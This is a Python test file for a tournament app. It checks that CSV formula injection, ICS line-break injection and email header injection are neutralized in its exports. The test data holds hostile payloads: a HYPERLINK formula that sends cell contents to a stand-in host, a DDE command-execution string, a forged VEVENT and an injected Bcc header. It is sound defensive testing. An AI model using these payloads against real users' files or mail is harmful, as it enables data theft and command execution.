"""Derived-surface output encoding — SP-SEC-1 Phase 2 (SEC-05, SEC-08, SEC-09).

The app's own screens are safe by React's default escaping. These three
surfaces are not React, so they inherit nothing:

- the bracket **CSV** export, opened in Excel/LibreOffice;
- the bracket **ICS** feed, subscribed to by a calendar client;
- **email**, whose headers are structural.

Every test drives a hostile participant name (or workspace name) through
the real renderer and asserts the payload is inert at the far end.
Negative controls are recorded in ``SEC_PROGRESS.md``.
"""
from __future__ import annotations

import pytest

from bracket.io.export_schedule import _csv_safe, _ics_escape, to_csv, to_ics


# --------------------------------------------------------------------
# SEC-05 — CSV / formula injection
# --------------------------------------------------------------------


class TestCsvFormulaInjection:
    """Negative control: delete the ``_csv_safe`` call in ``to_csv`` (or
    make ``_csv_safe`` the identity) and every test here fails."""

    @pytest.mark.parametrize(
        "payload",
        [
            '=HYPERLINK("https://evil.test/?"&A1,"Results")',  # exfiltration
            "=cmd|'/c calc'!A0",                               # DDE execution
            "+1+1",
            "-1+1",
            "@SUM(A1:A9)",
            "\t=1+1",                                          # TAB then formula
            "\r=1+1",                                          # CR then formula
        ],
    )
    def test_formula_payloads_are_neutralized(self, payload):
        assert _csv_safe(payload).startswith("'"), payload
        # The original text survives intact behind the guard — this is
        # neutralization, not censorship.
        assert _csv_safe(payload)[1:] == payload

    def test_ordinary_names_are_untouched(self):
        for name in ("Alice Chen", "O'Brien", "Wong, S.", "3M Team", "  spaced"):
            assert _csv_safe(name) == name

    def test_non_strings_pass_through_unchanged(self):
        """The writer emits ints and floats too; stringifying them here
        would change the file for no security gain."""
        for value in (0, 7, 3.5, None, True):
            assert _csv_safe(value) is value

    def test_a_malicious_participant_name_lands_inert_in_a_real_export(self):
        """End to end through ``to_csv``, not just the helper."""
        state = _state_with_participant_name('=cmd|\'/c calc\'!A0')
        body = to_csv(state, interval_minutes=30)
        assert "=cmd" in body                 # the name is still present…
        assert "'=cmd" in body                # …and defused
        # No cell begins with a bare formula character.
        for line in body.splitlines()[1:]:
            for cell in line.split(","):
                assert not cell.strip('"').startswith(("=", "+", "@")), cell


# --------------------------------------------------------------------
# SEC-08 — ICS content injection
# --------------------------------------------------------------------


class TestIcsInjection:
    """Negative control: drop the two ``\\r`` replacements from
    ``_ics_escape`` and ``test_carriage_return_cannot_end_a_property``
    plus the end-to-end test fail."""

    def test_carriage_return_cannot_end_a_property(self):
        """The bug that was live: LF was escaped, CR was not.

        ICS lines are CRLF-delimited, so a bare CR ends the value and
        everything after it parses as a new property.
        """
        escaped = _ics_escape("Evil\rEND:VEVENT")
        assert "\r" not in escaped
        assert escaped == "Evil\\nEND:VEVENT"

    @pytest.mark.parametrize("break_seq", ["\r\n", "\r", "\n"])
    def test_every_line_break_form_is_escaped(self, break_seq):
        escaped = _ics_escape(f"A{break_seq}B")
        assert "\r" not in escaped and "\n" not in escaped
        assert escaped == "A\\nB"

    def test_rfc5545_specials_still_escaped(self):
        assert _ics_escape("a,b") == "a\\,b"
        assert _ics_escape("a;b") == "a\\;b"
        assert _ics_escape("a\\b") == "a\\\\b"

    def test_injected_vevent_does_not_survive_a_real_export(self):
        state = _state_with_participant_name(
            "Mallory\r\nEND:VEVENT\r\nBEGIN:VEVENT\r\nSUMMARY:Injected"
        )
        body = to_ics(state, interval_minutes=30)

        # Assert on LINES, not substrings. The payload's text is still in
        # the file — inside the SUMMARY value, escaped — and a substring
        # count sees that copy and reports an injection that did not
        # happen. What matters is how many structural lines exist.
        lines = body.split("\r\n")
        assert lines.count("BEGIN:VEVENT") == 1, lines
        assert lines.count("END:VEVENT") == 1, lines
        assert not any(line.startswith("SUMMARY:Injected") for line in lines), lines

        # And the payload really is present-but-escaped, so this is
        # proving neutralization rather than the name being dropped.
        assert any("Mallory" in line and "\\n" in line for line in lines), lines

    def test_every_ics_line_is_a_property_or_delimiter(self):
        """Structural check: a value that broke out would show up as a
        line that is not ``NAME:value``."""
        state = _state_with_participant_name("Bad\rSUMMARY:nope")
        body = to_ics(state, interval_minutes=30)
        for line in body.split("\r\n"):
            if not line:
                continue
            assert ":" in line, line


# --------------------------------------------------------------------
# SEC-09 — email header safety
# --------------------------------------------------------------------


class TestEmailHeaderSafety:
    """Negative control: make ``_header_safe`` the identity and
    ``test_newline_in_subject_does_not_raise`` fails with the
    ``ValueError`` that used to surface as a 500."""

    def test_header_breaks_are_flattened(self):
        from core.email import _header_safe

        assert "\n" not in _header_safe("Spring\nBcc: attacker@evil.test")
        assert "\r" not in _header_safe("Spring\r\nBcc: attacker@evil.test")
        assert _header_safe("A\nB") == "A B"

    def test_newline_in_subject_does_not_raise(self, monkeypatch):
        """What the bug actually was.

        ``email.policy.default`` refuses to store a header containing a
        line break, so the injection never worked — it raised, and the
        raise escaped as an unhandled 500 *after* the invite row had been
        written. This drives the real ``EmailMessage`` construction.
        """
        from email.message import EmailMessage

        from core import email as email_module

        sent: dict = {}

        def _fake_smtp_send(*, to, subject, body):
            msg = EmailMessage()
            msg["From"] = "noreply@example.test"
            msg["To"] = to
            msg["Subject"] = subject        # raises if a break got through
            msg.set_content(body)
            sent["raw"] = msg.as_string()

        monkeypatch.setattr(email_module, "_send_smtp", _fake_smtp_send)
        monkeypatch.setattr(email_module.settings, "email_backend", "smtp")

        email_module.send_email(
            to="victim@example.test",
            subject="You're invited to Evil\nBcc: attacker@evil.test",
            body="hello",
        )

        raw = sent["raw"]
        # The literal text "Bcc:" surviving *inside* the subject value is
        # harmless — what matters is that it is not a header of its own.
        header_block = raw.split("\n\n", 1)[0]
        assert not any(
            line.lower().startswith("bcc:") for line in header_block.splitlines()
        ), header_block
        assert header_block.count("Subject:") == 1

    def test_overlong_subject_is_truncated(self):
        from core.email import _MAX_SUBJECT, _header_safe

        assert len(_header_safe("x" * (_MAX_SUBJECT * 3))) <= _MAX_SUBJECT

    def test_ordinary_subject_is_unchanged(self):
        from core.email import _header_safe

        assert _header_safe("You're invited to Spring Championship 2026") == (
            "You're invited to Spring Championship 2026"
        )


# --------------------------------------------------------------------
# XLSX — the Phase 0 claim, pinned
# --------------------------------------------------------------------


def test_xlsx_exports_are_not_formula_injectable_by_construction():
    """Phase 0 asserted the XLSX exports were safe because ExcelJS writes
    a JS string as a string-typed cell. That was a claim about a library,
    made from reading, with nothing holding it true.

    The exports are client-side TypeScript, so a Python test cannot drive
    them. What this pins instead is the property the claim rests on: the
    two export modules assign **plain strings** to ``cell.value`` and
    never construct a ``{formula: …}`` object. If someone introduces a
    formula cell, this fails and the Phase 0 reasoning gets revisited.
    """
    from pathlib import Path

    root = Path(__file__).resolve().parents[2] / "apps" / "console" / "src" / "modules"
    sources = [
        root / "bracket" / "exports" / "xlsxExports.ts",
        root / "meet" / "exports" / "xlsxExports.ts",
    ]
    for path in sources:
        assert path.exists(), path
        text = path.read_text(encoding="utf-8")
        assert "formula" not in text, (
            f"{path.name} now writes a formula cell — the SP-SEC-1 Phase 0 "
            "finding that XLSX export is not formula-injectable no longer holds"
        )


# --------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------


def _state_with_participant_name(name: str):
    """A minimal engine state with one assigned match and one hostile name.

    Built against the real ``scheduler_core.domain.tournament`` dataclasses
    so the exporters run over exactly the shape they see in production.
    """
    from scheduler_core.domain.tournament import (
        Event,
        Participant,
        PlayUnit,
        TournamentAssignment,
        TournamentState,
    )

    state = TournamentState()
    state.events["MS"] = Event(id="MS", type_tags=["MS"])
    state.participants["p1"] = Participant(id="p1", name=name)
    state.participants["p2"] = Participant(id="p2", name="Ordinary Opponent")
    state.play_units["MS-R0-0"] = PlayUnit(
        id="MS-R0-0",
        event_id="MS",
        side_a=["p1"],
        side_b=["p2"],
        metadata={"round": 0},
    )
    state.assignments["MS-R0-0"] = TournamentAssignment(
        play_unit_id="MS-R0-0", slot_id=0, court_id=1, duration_slots=1
    )
    return state
